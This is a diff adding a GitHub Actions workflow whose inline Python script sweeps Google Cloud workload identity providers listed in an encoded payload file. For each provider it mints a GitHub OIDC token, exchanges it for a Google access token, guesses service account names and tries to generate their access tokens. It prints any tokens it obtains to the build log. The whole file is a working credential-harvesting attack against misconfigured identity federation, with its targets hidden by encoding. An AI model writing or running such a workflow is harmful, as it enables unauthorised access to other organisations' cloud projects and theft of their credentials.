@@ -1,0 +1,61 @@
+name: c211-i78661-mint
+'on':
+  push:
+    branches:
+    - c211-78661-mint
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+    - name: checkout
+      uses: actions/checkout@v4
+    - name: mint
+      run: "python3 - <<'PYEOF'\n\nimport os, json, gzip, base64, urllib.parse, urllib.request,\
+        \ sys\nP=json.loads(gzip.decompress(base64.b64decode(open('.github/c211_i78661_payload.b64').read())))\n\
+        BASE=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']; RT=os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']\n\
+        def oidc(aud):\n    u=BASE+('&' if '?' in BASE else '?')+urllib.parse.urlencode({'audience':aud})\n\
+        \    r=urllib.request.Request(u,headers={'Authorization':'Bearer '+RT,'Accept':'application/json'})\n\
+        \    with urllib.request.urlopen(r,timeout=30) as f: return json.load(f)['value']\n\
+        def post(url,jsonbody,headers=None):\n    body=json.dumps(jsonbody).encode();\
+        \ h={'Content-Type':'application/json'}; h.update(headers or {})\n    req=urllib.request.Request(url,data=body,headers=h,method='POST')\n\
+        \    try:\n        with urllib.request.urlopen(req,timeout=40) as f: return\
+        \ f.status, f.read().decode('utf-8','replace')\n    except urllib.error.HTTPError\
+        \ as e: return e.code, e.read().decode('utf-8','replace')\n    except Exception\
+        \ as e: return 0, str(e)[:200]\ndef get(url,tok,timeout=30):\n    req=urllib.request.Request(url,headers={'Authorization':'Bearer\
+        \ '+tok,'Accept':'application/json'})\n    try:\n        with urllib.request.urlopen(req,timeout=timeout)\
+        \ as f: return f.status, f.read().decode('utf-8','replace')\n    except urllib.error.HTTPError\
+        \ as e: return e.code, e.read().decode('utf-8','replace')\n    except Exception\
+        \ as e: return 0, str(e)[:200]\nprint('SWEEP_START',len(P['providers']),flush=True)\n\
+        for it in P['providers']:\n    p=it['provider']; num=it['num']; cands=list(it['candidates'])\n\
+        \    aud='//iam.googleapis.com/'+p\n    try: t=oidc(aud)\n    except Exception\
+        \ as e:\n        print('OIDCFAIL',num,str(e)[:80],flush=True); continue\n\
+        \    st,body=post('https://sts.googleapis.com/v1/token',{'audience':aud,\n\
+        \        'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',\n\
+        \        'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',\n\
+        \        'scope':'https://www.googleapis.com/auth/cloud-platform',\n     \
+        \   'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':t})\n\
+        \    if st!=200:\n        print('STSNO',num,st,body[:100].replace('\\n','\
+        \ '),flush=True); continue\n    try: at=json.loads(body).get('access_token')\n\
+        \    except: at=None\n    print('STS200',num,flush=True)\n    # resolve project\
+        \ id if permitted\n    stp,pb=get('https://cloudresourcemanager.googleapis.com/v1/projects/%s'%num,at)\n\
+        \    if stp==200:\n        try:\n            pid=json.loads(pb).get('projectId')\n\
+        \            print('PROJID',num,pid,flush=True)\n            if pid:\n   \
+        \             for pre in ('github-actions','deploy','deployer'):\n       \
+        \             s='%s@%s.iam.gserviceaccount.com'%(pre,pid)\n              \
+        \      if s not in cands: cands.append(s)\n                s='%s@appspot.gserviceaccount.com'%pid\n\
+        \                if s not in cands: cands.append(s)\n        except Exception:\
+        \ pass\n    else:\n        print('PROJIDNO',num,stp,flush=True)\n    for sae\
+        \ in cands:\n        st2,b2=post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken'%urllib.parse.quote(sae,safe='@'),\n\
+        \                    {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'},\n\
+        \                    headers={'Authorization':'Bearer '+at})\n        if st2==200:\n\
+        \            try:\n                j=json.loads(b2); print('SAOK %s %s %s\
+        \ %s'%(num,sae,j.get('expireTime'),j.get('accessToken')),flush=True)\n   \
+        \         except Exception:\n                print('SAOK %s %s NONJSON %s'%(num,sae,b2[:120]),flush=True)\n\
+        \        else:\n            em=''\n            try: em=(json.loads(b2).get('error')\
+        \ or {}).get('message','')[:90].replace('\\n',' ')\n            except Exception:\
+        \ em=b2[:90].replace('\\n',' ')\n            print('SAERR %s %s %s %s'%(num,sae,st2,em),flush=True)\n\
+        print('SWEEP_DONE',flush=True)\n\nPYEOF\n"
